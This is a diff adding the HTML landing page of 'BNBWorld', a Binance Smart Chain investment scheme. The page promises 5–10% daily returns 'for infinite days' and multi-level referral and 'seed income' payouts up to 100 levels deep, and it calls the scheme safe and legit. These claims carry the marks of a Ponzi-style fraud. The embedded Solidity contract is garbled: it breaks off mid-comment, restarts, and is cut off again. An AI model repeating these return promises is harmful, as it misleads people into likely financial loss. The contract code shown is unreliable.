@@ -1,0 +1,4214 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BNBWorld</title>
+
+
+  <link rel="stylesheet" href="libs/normalize/normalize9e92.css" media="screen">
+
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <link rel="stylesheet" href="libs/simple-scroll/simplebar.css">
+  <link rel="stylesheet" href="libs/prism/prism.css">
+  <link rel="stylesheet" href="css/main9e92.css" media="screen">
+
+  <link rel="icon" href="img/fav.png" type="image/x-icon">
+
+  <script src="libs/jquery/jquery-3.2.1.min9e92.js"></script>
+
+  <script src="npm/chart.js@2.8.0.js"></script>
+
+  <link rel="stylesheet" href="ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<body class="home">
+  <div class="page-wrap">
+
+
+
+
+
+
+    <!-- promo section -->
+    <div class="main-section">
+      <div class="decor"></div>
+      <header class="header">
+        <div class="wrapper">
+          <div class="t-panel">
+            <div class="hstats">
+              <!--<div class="balance">
+                 Contract balance in <span class="bnb"></span>:
+                <div class="balance-val js-contract-balance" id="contract-balance"><span class="bnb"> BNB</span>
+                </div> 
+              </div>-->
+              <div class="profit">
+                Your Address -
+                <div class="next" id="address"></div>
+              </div>
+            </div>
+            <!--  <a href="https://www.bscscan.com/address/0xf4E9ae6085eD6C06e9060F03339CfBE1Ef24D5dB" class="btn" target="_blank">Check Contract</a> -->
+          </div>
+
+          <nav class="main-nav">
+            <button class="menu-toggle">Menu</button>
+            <div class="menu-wrap">
+              <ul class="menu">
+                <li><a href="#about" data-toggle="scroll">About Us</a>
+                </li>
+                <li><a href="#investment" data-toggle="scroll">Smart Investment Plans</a>
+                </li>
+                <li><a href="#contacts" data-toggle="scroll">Ask Us Questions</a>
+                </li>
+                <li><a data-modal="" data-src="#stat" href="#">Make Investment</a>
+                </li>
+                <!-- <li><a href="#" data-modal="" data-src="#promo">Promote Us</a>
+                </li> -->
+              </ul>
+              <button class="menu-close"></button>
+            </div>
+            <div class="btn-wrap">
+              <a data-modal="" onclick="connect()" id="btnc" class="btn">
+                <span style="font-size:1.2rem" class="mt-2" id="connect">Connect</span>
+                <span style="font-size:1.2rem" class="mt-2" id="dashboard"></span>
+
+              </a><!-- data-modal="" href="#" id="connectButton" -->
+              <!-- <a data-modal="" href="#" id="dashboard" class="btn" data-src="#stat" >DASHBOARD</a> -->
+            </div>
+          </nav>
+        </div>
+      </header>
+      <div class="wrapper">
+        <div class="main-content">
+          <a href="#" class="logo">
+            <img src="img/bnbworldlogo.png" alt="">
+          </a>
+          <h1>bnbworld yield Smart Contract</h1>
+          <p id="bnbprice" hidden="">488.12</p>
+          <p>bnbworld Binance smart chain based verified audited contract enables the use of Binance Coin BEP-20 for use
+            in yield investment industry. The Longevity and stability of bnbworld will ultimately bring crypto users,
+            miners, investors under single platform to stake, refer and earn seed income with unlimited opportunities
+            making use of decentralization becomes a perfect yield platform which operates effortlessly 24x7 all the
+            days of year!</p>
+        </div>
+      </div>
+    </div>
+    <!-- promo section end -->
+
+    <!-- about section -->
+    <div class="about">
+      <div class="wrapper clearfix">
+        <div class="about-info">
+          <div class="daily">
+            <div class="daily-num js-contract-rate">
+              10%
+            </div>
+            <div class="daily-content">
+              Current Max Daily Profit - <span class="js-contract-rate">10%</span>
+              <div class="daily-capt">
+                Additional Seed income bonus for every block
+              </div>
+              <div class="daily-val" data-num="0" style="display:none;">0</div>
+            </div>
+          </div>
+          <div class="block">
+            <div class="block-title">Interest Calculator</div>
+            <form>
+              <div class="calc-top">
+                <div class="calc-input">
+                  <input type="text" class="input" id="amt" data-current-bonus="0.1" data-base-bonus="5" value="1">
+                  <span class="label"><span class="bnb"></span></span>
+                  <br>
+                  <select class="input" name="plan" id="plan" onchange="calculateAmount(this.value)">
+                    <option value="" disabled="" selected="">Choose your Plan</option>
+                    <option value="hen">Moon Farming</option>
+                    <option value="cow">Mars Farming</option>
+                    <option value="ox">Jupiter Farming</option>
+                    <!-- <option value="ox">Ox Farming</option> -->
+                  </select>
+
+                </div>
+                <div class="calc-time">
+
+                  <i class="svgicon svgicon-time">
+
+                    <svg>
+
+                      <use xlink:href="img/icons/symbol/sprite.svg#time"></use>
+
+                    </svg>
+
+                  </i>
+                  Earning in Real Time
+                </div>
+              </div>
+              <div class="table">
+                <div class="table-row">
+                  <div class="label">Daily Profit %</div>
+                  <div class="val" id="daily"><span class="badge"></span>
+                  </div>
+                </div>
+                <div class="table-row">
+                  <div class="label">Daily Profit BNB</div>
+                  <div class="val" id="dailybnb"><span class="badge"></span>
+                  </div>
+                </div>
+                <div class="table-row">
+                  <div class="label">Maximum Profit %</div>
+                  <div class="val" id="max"><span class="badge"></span>
+                  </div>
+                </div>
+              </div>
+            </form>
+          </div>
+          <div class="block">
+            <div class="stats">
+              <div class="stats-row">
+                <div class="stats-item">
+                  <div class="stats-label"><span class="">1</span> <span class="cur"><span class="bnb"></span></span>
+                  </div>
+                  Deposit Amount
+                </div>
+                <div class="stats-item">
+                  <div class="stats-label"><span class="js-contract-rateNP">225</span> <span class="cur">%</span> | 2.25
+                    <span class="bnb"></span>
+                  </div>
+                  Farming Profit
+                </div>
+              </div>
+              <div class="stats-row">
+                <div class="stats-item">
+                  <div class="stats-label"><span class="js-contract-rateNP">5</span> <span class="cur">%</span> | 0.05
+                    <span class="bnb"></span>
+                  </div>
+                  Referral Profit
+                </div>
+                <div class="stats-item">
+                  <div class="stats-label"><span class="js-contract-rateNP">200</span> <span class="cur">%</span> | 2
+                    <span class="bnb"></span>
+                  </div>
+                  Seed Income
+                </div>
+              </div>
+              <div class="stats-row">
+                <div class="stats-item">
+                  <div class="stats-label">3.3764 <span class="bnb"></span>
+                  </div>
+                  Total Maximal Return
+                </div>
+                <div class="stats-item btn-item">
+                  <a data-modal="" data-src="#stat" href="#" class="btn btn-2 btn-block">Get Started Now</a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="about-content">
+
+          <div class="about-list">
+            <div class="about-item">
+
+
+              Yield income paid on <strong>each and every block </strong> on Binance Smart Chain (approximately 3
+              seconds) from 60 days to Maximum is infinity.
+            </div>
+            <div class="about-item">
+              Minimum <strong>5% daily for infinite days (practically limited 10,000 days) </strong> to up to short term
+              yield of 10% daily for 20 days.
+            </div>
+            <div class="about-item">
+              User can refer <strong>unlimited</strong> users under any level which way goes paying upto 10 Levels
+              starting from <strong>6%</strong> to a total of upto <strong>18%</strong> unrestricted earing potentials
+            </div>
+            <div class="about-item">
+              Seed Incomes paid on each and every block and upto <strong>77.3%</strong> of referrals dividends yield
+              income which is again unrestricted earning potentials.
+            </div>
+            <div class="about-item">
+              Safe, transparent, legit, decentralized never ending farm yield to earn from.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- about section end -->
+
+    <!-- why section -->
+    <section class="why" id="about">
+      <div class="wrapper">
+        <h2><strong>Why</strong> BNBWorld?</h2>
+        <div class="why-columns">
+          <div class="column">
+            <div class="why-icon">
+              <img src="img/icons/profit.png" alt="">
+            </div>
+            <h4 class="why-title">What is Seed income? </h4>
+            <div class="why-content">
+              <p>Seed income is referred to income generated in real time over your referral dividends. </p>
+              <p>E.g. User A refers user B, User B invested 10 BNB in plan Ox farming receiving 10% daily so user A
+                would be entitled to receive 10% of 0.3 BNB i.e. 0.03 BNB daily. </p>
+              <p>At bnbworld user gets opportunity to earn seed income from its downline upto 100 Level paid every
+                second 24X7 and are instantly available for withdrawals without any restrictions.</p>
+            </div>
+          </div>
+          <div class="column">
+            <div class="why-icon">
+              <img src="img/icons/referral.png" alt="">
+            </div>
+            <h4 class="why-title">Referral Program</h4>
+            <div class="why-content">
+              <p>No business in the world succussed without team members at bnbworld each of referral is a team member
+                on its own towards bnbworld. </p>
+              <p>Fast BNB offer unrestricted unlimited potential for referral income upto 10 Level where each level on
+                its own can have unlimited referrals.</p>
+              <p>bnbworld offers Level-1= 6%, Level-2=4%, Level-3=3%, Level-4=2%, Level-5=1%, Level-6=0.5%,
+                Level-7=0.5%, Level-8=0.5%, Level-9=0.25% & Level-10=0.25% </p>
+              <p>In total of 18% in referral commission.</p>
+            </div>
+          </div>
+          <div class="column diagram-column">
+            <div class="diagram">
+              <div class="diagram-main">
+                <canvas id="chart" width="216" height="216"></canvas>
+                <script>
+                  var ctx = document.getElementById('chart').getContext('2d');
+
+
+                  var data = {
+                    datasets: [{
+                      data: [85, 5, 10],
+                      backgroundColor: [
+                        '#F0BA4A',
+                        '#B2B2B2',
+                        '#6DA544',
+                      ],
+                      borderColor: '#1D2637',
+                      borderWidth: 3,
+
+                    }],
+                    labels: [
+                      'Main Contract Balance, <br/>Liquidity Farming',
+                      'For Marketing',
+                      'For Admin',
+                    ]
+                  };
+
+                  var myDoughnutChart = new Chart(ctx, {
+                    type: 'doughnut',
+                    data: data,
+                    options: {
+                      cutoutPercentage: 60,
+                      legend: {
+                        display: false
+                      },
+                      hover: false,
+                      tooltips: {
+                        enabled: false,
+                        custom: function (tooltipModel) {
+                          // Tooltip Element
+                          var tooltipEl = document.getElementById('chartjs-tooltip');
+
+                          // Create element on first render
+                          if (!tooltipEl) {
+                            tooltipEl = document.createElement('div');
+                            tooltipEl.id = 'chartjs-tooltip';
+                            tooltipEl.innerHTML = '<table></table>';
+                            document.body.appendChild(tooltipEl);
+                          }
+
+                          // Hide if no tooltip
+                          if (tooltipModel.opacity === 0) {
+                            tooltipEl.style.opacity = 0;
+                            return;
+                          }
+
+                          // Set caret Position
+                          tooltipEl.classList.remove('above', 'below', 'no-transform');
+                          if (tooltipModel.yAlign) {
+                            tooltipEl.classList.add(tooltipModel.yAlign);
+                          } else {
+                            tooltipEl.classList.add('no-transform');
+                          }
+
+                          function getBody(bodyItem) {
+                            return bodyItem.lines;
+                          }
+
+                          // Set Text
+                          if (tooltipModel.body) {
+                            var titleLines = tooltipModel.title || [];
+                            var bodyLines = tooltipModel.body.map(getBody);
+
+                            var innerHtml = '<thead>';
+
+                            titleLines.forEach(function (title) {
+                              innerHtml += '<tr><th>' + title + '</th></tr>';
+                            });
+                            innerHtml += '</thead><tbody>';
+
+                            bodyLines.forEach(function (body, i) {
+                              var colors = tooltipModel.labelColors[i];
+                              var style = 'background:' + colors.backgroundColor;
+                              style += '; border-color:' + colors.borderColor;
+                              style += '; border-width: 2px';
+                              var span = '<span style="' + style + '"></span>';
+                              innerHtml += '<tr><td>' + span + body + '</td></tr>';
+                            });
+                            innerHtml += '</tbody>';
+
+                            var tableRoot = tooltipEl.querySelector('table');
+                            tableRoot.innerHTML = innerHtml;
+                          }
+
+                          // `this` will be the overall tooltip
+                          var position = this._chart.canvas.getBoundingClientRect();
+
+                          // Display, position, and set styles for font
+                          tooltipEl.style.opacity = 1;
+                          tooltipEl.style.position = 'absolute';
+                          tooltipEl.style.left = position.left + window.pageXOffset + tooltipModel.x + 'px';
+                          tooltipEl.style.top = position.top + window.pageYOffset + tooltipModel.y + 'px';
+                          tooltipEl.style.fontFamily = tooltipModel._bodyFontFamily;
+                          tooltipEl.style.fontSize = tooltipModel.bodyFontSize + 'px';
+                          tooltipEl.style.fontStyle = tooltipModel._bodyFontStyle;
+                          tooltipEl.style.fontColor = "#FFF";
+                          tooltipEl.style.backgroundColor = "#5DAA80";
+                          tooltipEl.style.cornerRadius = 5;
+
+
+                          tooltipEl.style.padding = '7px ' + ' 15px';
+                          tooltipEl.style.pointerEvents = 'none';
+                        }
+                      }
+                    }
+                  });
+                </script>
+              </div>
+              <div class="diagram-capt">
+                <span>85%</span>
+                Main Contract Balance,
+                <br>Liquidity Farming
+              </div>
+            </div>
+            <table class="legend">
+              <tr>
+                <td>Main Contract Balance,
+                  <br>Liquidity Farming
+                </td>
+                <td style="color: #F0BA4A; font-size: 18px;">85%</td>
+              </tr>
+              <tr>
+                <td>For Marketing</td>
+                <td style="color: #B2B2B2; font-size: 18px;">5%</td>
+              </tr>
+              <tr>
+                <td>For Admin</td>
+                <td style="color: #6DA544; font-size: 18px;">10%</td>
+              </tr>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+    <!-- why section end -->
+
+    <!-- code-block-->
+    <div class="code-block ">
+      <div class="wrapper clearfix">
+        <div class="code-block-left">
+          <div class="code-block-title">
+            <img src="img/icons/solidity6654.svg" alt="Solidity logo">Solidity Code
+
+          </div>
+
+          <div class="code-panel">
+            <div class="code-wrap" data-simplebar="">
+              <pre class='line-numbers language-javascript'><code class="">
+pragma solidity 0.5.10;
+
+contract BNBWorld {
+	using SafeMath for uint256;
+
+	uint256 constant public INVEST_MIN_AMOUNT = 1e17; // 0.1 bnb 
+	uint256[] public REFERRAL_PERCENTS 	= [600, 400, 300, 200, 100, 50, 50, 50, 25, 25];
+	uint256[] public SEED_PERCENTS 		= [1000, 900, 800, 700, 600, 500, 400, 300, 200, 100, 75, 75, 75, 75, 50, 50, 50, 50, 50, 50, 20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20];
+	uint256 constant public PROJECT_FEE = 1000;
+	uint256 constant public PERCENT_STEP = 10;
+	uint256 constant public PERCENTS_DIVIDER = 10000;
+	uint256 constant public PLANPER_DIVIDER = 10000;
+	uint256 constant public TIME_STEP = 1 days;
+
+	uint256 public totalInvested;
+	uint256 public totalRefBonus;
+	
+	
+	address chkLv2;
+    address chkLv3;
+    address chkLv4;
+    address chkLv5;
+    address chkLv6;
+    address chkLv7;
+    address chkLv8;
+    address chkLv9;
+    address chkLv10;
+	
+	address chkLv11;
+	address chkLv12;
+    address chkLv13;
+    address chkLv14;
+    address chkLv15;
+    address chkLv16;
+    address chkLv17;
+    address chkLv18;
+    address chkLv19;
+    address chkLv20;
+	
+	address chkLv21;
+	address chkLv22;
+    address chkLv23;
+    address chkLv24;
+    address chkLv25;
+    address chkLv26;
+    address chkLv27;
+    address chkLv28;
+    address chkLv29;
+    address chkLv30;
+	
+	address chkLv31;
+	address chkLv32;
+    address chkLv33;
+    address chkLv34;
+    address chkLv35;
+    address chkLv36;
+    address chkLv37;
+    address chkLv38;
+    address chkLv39;
+    address chkLv40;
+	
+	address chkLv41;
+	address chkLv42;
+    address chkLv43;
+    address chkLv44;
+    address chkLv45;
+    address chkLv46;
+    address chkLv47;
+    address chkLv48;
+    address chkLv49;
+    address chkLv50;
+	
+	address chkLv51;
+	address chkLv52;
+    address chkLv53;
+    address chkLv54;
+    address chkLv55;
+    address chkLv56;
+    address chkLv57;
+    address chkLv58;
+    address chkLv59;
+    address chkLv60;
+	
+	address chkLv61;
+	address chkLv62;
+    address chkLv63;
+    address chkLv64;
+    address chkLv65;
+    address chkLv66;
+    address chkLv67;
+    address chkLv68;
+    address chkLv69;
+    address chkLv70;
+	
+	address chkLv71;
+	address chkLv72;
+    address chkLv73;
+    address chkLv74;
+    address chkLv75;
+    address chkLv76;
+    address chkLv77;
+    address chkLv78;
+    address chkLv79;
+    address chkLv80;
+	
+	address chkLv81;
+	address chkLv82;
+    address chkLv83;
+    address chkLv84;
+    address chkLv85;
+    address chkLv86;
+    address chkLv87;
+    address chkLv88;
+    address chkLv89;
+    address chkLv90;
+	
+	address chkLv91;
+	address chkLv92;
+    address chkLv93;
+    address chkLv94;
+    address chkLv95;
+    address chkLv96;
+    address chkLv97;
+    address chkLv98;
+    address chkLv99;
+    address chkLv100;
+	
+	
+    
+    struct RefUserDetail {
+        address refUserAddress;
+        uint256 refLevel;
+    }
+
+    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
+    mapping(address => uint256) public referralCount_;
+    
+	
+	mapping(address => address) internal referralLevel1Address;
+    mapping(address => address) internal referralLevel2Address;
+    mapping(address => address) internal referralLevel3Address;
+    mapping(address => address) internal referralLevel4Address;
+    mapping(address => address) internal referralLevel5Address;
+    mapping(address => address) internal referralLevel6Address;
+    mapping(address => address) internal referralLevel7Address;
+    mapping(address => address) internal referralLevel8Address;
+    mapping(address => address) internal referralLevel9Address;
+    mapping(address => address) internal referralLevel10Address;
+	
+	mapping(address => address) internal referralLevel11Address;
+    mapping(address => address) internal referralLevel12Address;
+    mapping(address => address) internal referralLevel13Address;
+    mapping(address => address) internal referralLevel14Address;
+    mapping(address => address) internal referralLevel15Address;
+    mapping(address => address) internal referralLevel16Address;
+    mapping(address => address) internal referralLevel17Address;
+    mapping(address => address) internal referralLevel18Address;
+    mapping(address => address) internal referralLevel19Address;
+    mapping(address => address) internal referralLevel20Address;
+	
+	mapping(address => address) internal referralLevel21Address;
+    mapping(address => address) internal referralLevel22Address;
+    mapping(address => address) internal referralLevel23Address;
+    mapping(address => address) internal referralLevel24Address;
+    mapping(address => address) internal referralLevel25Address;
+    mapping(address => address) internal referralLevel26Address;
+    mapping(address => address) internal referralLevel27Address;
+    mapping(address => address) internal referralLevel28Address;
+    mapping(address => address) internal referralLevel29Address;
+    mapping(address => address) internal referralLevel30Address;
+	
+	mapping(address => address) internal referralLevel31Address;
+    mapping(address => address) internal referralLevel32Address;
+    mapping(address => address) internal referralLevel33Address;
+    mapping(address => address) internal referralLevel34Address;
+    mapping(address => address) internal referralLevel35Address;
+    mapping(address => address) internal referralLevel36Address;
+    mapping(address => address) internal referralLevel37Address;
+    mapping(address => address) internal referralLevel38Address;
+    mapping(address => address) internal referralLevel39Address;
+    mapping(address => address) internal referralLevel40Address;
+	
+	mapping(address => address) internal referralLevel41Address;
+    mapping(address => address) internal referralLevel42Address;
+    mapping(address => address) internal referralLevel43Address;
+    mapping(address => address) internal referralLevel44Address;
+    mapping(address => address) internal referralLevel45Address;
+    mapping(address => address) internal referralLevel46Address;
+    mapping(address => address) internal referralLevel47Address;
+    mapping(address => address) internal referralLevel48Address;
+    mapping(address => address) internal referralLevel49Address;
+    mapping(address => address) internal referralLevel50Address;
+    
+	mapping(address => address) internal referralLevel51Address;
+    mapping(address => address) internal referralLevel52Address;
+    mapping(address => address) internal referralLevel53Address;
+    mapping(address => address) internal referralLevel54Address;
+    mapping(address => address) internal referralLevel55Address;
+    mapping(address => address) internal referralLevel56Address;
+    mapping(address => address) internal referralLevel57Address;
+    mapping(address => address) internal referralLevel58Address;
+    mapping(address => address) internal referralLevel59Address;
+    mapping(address => address) internal referralLevel60Address;
+	
+	mapping(address => address) internal referralLevel61Address;
+    mapping(address => address) internal referralLevel62Address;
+    mapping(address => address) internal referralLevel63Address;
+    mapping(address => address) internal referralLevel64Address;
+    mapping(address => address) internal referralLevel65Address;
+    mapping(address => address) internal referralLevel66Address;
+    mapping(address => address) internal referralLevel67Address;
+    mapping(address => address) internal referralLevel68Address;
+    mapping(address => address) internal referralLevel69Address;
+    mapping(address => address) internal referralLevel70Address;
+	
+	mapping(address => address) internal referralLevel71Address;
+    mapping(address => address) internal referralLevel72Address;
+    mapping(address => address) internal referralLevel73Address;
+    mapping(address => address) internal referralLevel74Address;
+    mapping(address => address) internal referralLevel75Address;
+    mapping(address => address) internal referralLevel76Address;
+    mapping(address => address) internal referralLevel77Address;
+    mapping(address => address) internal referralLevel78Address;
+    mapping(address => address) internal referralLevel79Address;
+    mapping(address => address) internal referralLevel80Address;
+	
+	mapping(address => address) internal referralLevel81Address;
+    mapping(address => address) internal referralLevel82Address;
+    mapping(address => address) internal referralLevel83Address;
+    mapping(address => address) internal referralLevel84Address;
+    mapping(address => address) internal referralLevel85Address;
+    mapping(address => address) internal referralLevel86Address;
+    mapping(address => address) internal referralLevel87Address;
+    mapping(address => address) internal referralLevel88Address;
+    mapping(address => address) internal referralLevel89Address;
+    mapping(address => address) internal referralLevel90Address;
+	
+	mapping(address => address) internal referralLevel91Address;
+    mapping(address => address) internal referralLevel92Address;
+    mapping(address => address) internal referralLevel93Address;
+    mapping(address => address) internal referralLevel94Address;
+    mapping(address => address) internal referralLevel95Address;
+    mapping(address => address) internal referralLevel96Address;
+    mapping(address => address) internal referralLevel97Address;
+    mapping(address => address) internal referralLevel98Address;
+    mapping(address => address) internal referralLevel99Address;
+    mapping(address => address) internal referralLevel100Address;
+    
+	
+
+    struct Plan {
+        uint256 time;
+        uint256 percent;
+    }
+
+    Plan[] internal plans;
+
+	struct Deposit {
+        uint8 plan;
+		uint256 amount;
+		uint256 start;
+	}
+
+	struct User {
+		Deposit[] deposits;
+		uint256 checkpoint;
+		address referrer;
+		uint256[10] levels;
+		uint256 bonus;
+		uint256 totalBonus;
+		uint256 seedincome;
+		uint256 withdrawn;
+		uint256 withdrawnseed;
+	}
+	
+	
+	
+
+	mapping (address => User) internal users;
+
+	bool public started;
+	address payable public commissionWallet;
+
+	event Newbie(address user);
+	event NewDeposit(address indexed user, uint8 plan, uint256 amount);
+	event Withdrawn(address indexed user, uint256 amount);
+	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
+	event SeedIncome(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
+	event FeePayed(address indexed user, uint256 totalAmount);
+
+	constructor(address payable wallet) public {
+		require(!isContract(wallet));
+		commissionWallet = wallet;
+
+        plans.push(Plan(10000, 125));
+		plans.push(Plan(150, 250));
+		plans.push(Plan(90, 300));
+       
+	}
+	
+	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
+        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
+    }
+    
+    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
+        referralCount_[senderAddress]++;
+        uint dataId = referralCount_[senderAddress];
+        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
+        RefUser[senderAddress][dataId].refLevel = refLevel;
+    }
+
+    
+	
+	
+	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
+       
+          address _customerAddress        = _sender;
+        // Level 1
+        referralLevel1Address[_customerAddress]                     = _referredBy;
+        if(_newReferral == true) {
+            addDownlineRef(_referredBy, _customerAddress, 1);
+        }
+        
+        chkLv2                          = referralLevel1Address[_referredBy];
+        chkLv3                          = referralLevel2Address[_referredBy];
+        chkLv4                          = referralLevel3Address[_referredBy];
+        chkLv5                          = referralLevel4Address[_referredBy];
+        chkLv6                          = referralLevel5Address[_referredBy];
+        chkLv7                          = referralLevel6Address[_referredBy];
+        chkLv8                          = referralLevel7Address[_referredBy];
+        chkLv9                          = referralLevel8Address[_referredBy];
+        chkLv10                         = referralLevel9Address[_referredBy];
+		
+		chkLv11                          = referralLevel10Address[_referredBy];
+	    chkLv12                          = referralLevel11Address[_referredBy];
+        chkLv13                          = referralLevel12Address[_referredBy];
+        chkLv14                          = referralLevel13Address[_referredBy];
+        chkLv15                          = referralLevel14Address[_referredBy];
+        chkLv16                          = referralLevel15Address[_referredBy];
+        chkLv17                          = referralLevel16Address[_referredBy];
+        chkLv18                          = referralLevel17Address[_referredBy];
+        chkLv19                          = referralLevel18Address[_referredBy];
+        chkLv20                          = referralLevel19Address[_referredBy];
+		
+	    chkLv21                          = referralLevel20Address[_referredBy];
+	    chkLv22                          = referralLevel21Address[_referredBy];
+        chkLv23                          = referralLevel22Address[_referredBy];
+        chkLv24                          = referralLevel23Address[_referredBy];
+        chkLv25                          = referralLevel24Address[_referredBy];
+        chkLv26                          = referralLevel25Address[_referredBy];
+        chkLv27                          = referralLevel26Address[_referredBy];
+        chkLv28                          = referralLevel27Address[_referredBy];
+        chkLv29                          = referralLevel28Address[_referredBy];
+        chkLv30                          = referralLevel29Address[_referredBy];
+		
+		chkLv31                          = referralLevel30Address[_referredBy];
+	    chkLv32                          = referralLevel31Address[_referredBy];
+        chkLv33                          = referralLevel32Address[_referredBy];
+        chkLv34                          = referralLevel33Address[_referredBy];
+        chkLv35                          = referralLevel34Address[_referredBy];
+        chkLv36                          = referralLevel35Address[_referredBy];
+        chkLv37                          = referralLevel36Address[_referredBy];
+        chkLv38                          = referralLevel37Address[_referredBy];
+        chkLv39                          = referralLevel38Address[_referredBy];
+        chkLv40                          = referralLevel39Address[_referredBy];
+		
+		chkLv41                          = referralLevel40Address[_referredBy];
+	    chkLv42                          = referralLevel41Address[_referredBy];
+        chkLv43                          = referralLevel42Address[_referredBy];
+        chkLv44                          = referralLevel43Address[_referredBy];
+        chkLv45                          = referralLevel44Address[_referredBy];
+        chkLv46                          = referralLevel45Address[_referredBy];
+        chkLv47                          = referralLevel46Address[_referredBy];
+        chkLv48                          = referralLevel47Address[_referredBy];
+        chkLv49                          = referralLevel48Address[_referredBy];
+        chkLv50                          = referralLevel49Address[_referredBy];
+		
+		chkLv51                          = referralLevel50Address[_referredBy];
+	    chkLv52                          = referralLevel51Address[_referredBy];
+        chkLv53                          = referralLevel52Address[_referredBy];
+        chkLv54                          = referralLevel53Address[_referredBy];
+        chkLv55                          = referralLevel54Address[_referredBy];
+        chkLv56                          = referralLevel55Address[_referredBy];
+        chkLv57                          = referralLevel56Address[_referredBy];
+        chkLv58                          = referralLevel57Address[_referredBy];
+        chkLv59                          = referralLevel58Address[_referredBy];
+        chkLv60                          = referralLevel59Address[_referredBy];
+		
+		chkLv61                          = referralLevel60Address[_referredBy];
+	    chkLv62                          = referralLevel61Address[_referredBy];
+        chkLv63                          = referralLevel62Address[_referredBy];
+        chkLv64                          = referralLevel63Address[_referredBy];
+        chkLv65                          = referralLevel64Address[_referredBy];
+        chkLv66                          = referralLevel65Address[_referredBy];
+        chkLv67                          = referralLevel66Address[_referredBy];
+        chkLv68                          = referralLevel67Address[_referredBy];
+        chkLv69                          = referralLevel68Address[_referredBy];
+        chkLv70                          = referralLevel69Address[_referredBy];
+		
+		chkLv71                          = referralLevel70Address[_referredBy];
+	    chkLv72                          = referralLevel71Address[_referredBy];
+        chkLv73                          = referralLevel72Address[_referredBy];
+        chkLv74                          = referralLevel73Address[_referredBy];
+        chkLv75                          = referralLevel74Address[_referredBy];
+        chkLv76                          = referralLevel75Address[_referredBy];
+        chkLv77                          = referralLevel76Address[_referredBy];
+        chkLv78                          = referralLevel77Address[_referredBy];
+        chkLv79                          = referralLevel78Address[_referredBy];
+        chkLv80                          = referralLevel79Address[_referredBy];
+		
+        chkLv81                          = referralLevel80Address[_referredBy];
+	    chkLv82                          = referralLevel81Address[_referredBy];
+        chkLv83                          = referralLevel82Address[_referredBy];
+        chkLv84                          = referralLevel83Address[_referredBy];
+        chkLv85                          = referralLevel84Address[_referredBy];
+        chkLv86                          = referralLevel85Address[_referredBy];
+        chkLv87                          = referralLevel86Address[_referredBy];
+        chkLv88                          = referralLevel87Address[_referredBy];
+        chkLv89                          = referralLevel88Address[_referredBy];
+        chkLv90                          = referralLevel89Address[_referredBy];
+		
+		chkLv91                          = referralLevel90Address[_referredBy];
+	    chkLv92                          = referralLevel91Address[_referredBy];
+        chkLv93                          = referralLevel92Address[_referredBy];
+        chkLv94                          = referralLevel93Address[_referredBy];
+        chkLv95                          = referralLevel94Address[_referredBy];
+        chkLv96                          = referralLevel95Address[_referredBy];
+        chkLv98                          = referralLevel97Address[_referredBy];
+        chkLv99                          = referralLevel98Address[_referredBy];
+        chkLv100                         = referralLevel99Address[_referredBy];
+		
+		
+		
+		
+		
+		
+        // Leve
+pragma solidity 0.5.10;
+
+contract BNBWorld {
+	using SafeMath for uint256;
+
+	uint256 constant public INVEST_MIN_AMOUNT = 1e17; // 0.1 bnb 
+	uint256[] public REFERRAL_PERCENTS 	= [600, 400, 300, 200, 100, 50, 50, 50, 25, 25];
+	uint256[] public SEED_PERCENTS 		= [1000, 900, 800, 700, 600, 500, 400, 300, 200, 100, 75, 75, 75, 75, 50, 50, 50, 50, 50, 50, 20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20];
+	uint256 constant public PROJECT_FEE = 1000;
+	uint256 constant public PERCENT_STEP = 10;
+	uint256 constant public PERCENTS_DIVIDER = 10000;
+	uint256 constant public PLANPER_DIVIDER = 10000;
+	uint256 constant public TIME_STEP = 1 days;
+
+	uint256 public totalInvested;
+	uint256 public totalRefBonus;
+	
+	
+	address chkLv2;
+    address chkLv3;
+    address chkLv4;
+    address chkLv5;
+    address chkLv6;
+    address chkLv7;
+    address chkLv8;
+    address chkLv9;
+    address chkLv10;
+	
+	address chkLv11;
+	address chkLv12;
+    address chkLv13;
+    address chkLv14;
+    address chkLv15;
+    address chkLv16;
+    address chkLv17;
+    address chkLv18;
+    address chkLv19;
+    address chkLv20;
+	
+	address chkLv21;
+	address chkLv22;
+    address chkLv23;
+    address chkLv24;
+    address chkLv25;
+    address chkLv26;
+    address chkLv27;
+    address chkLv28;
+    address chkLv29;
+    address chkLv30;
+	
+	address chkLv31;
+	address chkLv32;
+    address chkLv33;
+    address chkLv34;
+    address chkLv35;
+    address chkLv36;
+    address chkLv37;
+    address chkLv38;
+    address chkLv39;
+    address chkLv40;
+	
+	address chkLv41;
+	address chkLv42;
+    address chkLv43;
+    address chkLv44;
+    address chkLv45;
+    address chkLv46;
+    address chkLv47;
+    address chkLv48;
+    address chkLv49;
+    address chkLv50;
+	
+	address chkLv51;
+	address chkLv52;
+    address chkLv53;
+    address chkLv54;
+    address chkLv55;
+    address chkLv56;
